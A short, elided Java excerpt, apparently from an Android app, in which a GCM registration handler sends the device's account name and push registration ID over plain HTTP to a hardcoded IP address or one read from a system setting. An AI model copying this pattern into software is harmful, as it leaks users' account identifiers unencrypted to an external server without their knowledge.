...
public class GCMIntentService extends GCMBaseIntentService {
	...
	protected void onRegistered(Context context, String regId) {
		...
		try {
			...
			String ipaddr = Settings.System.getString(SystemUI.mContext.getContentResolver(), "DCLOUD_IPADDR");
			if(ipaddr == null)
				ipaddr = "211.189.19.25:3000";
			HttpGet get = new HttpGet("http://" + ipaddr + "/addUser/" + acct.name + "/" + regId);
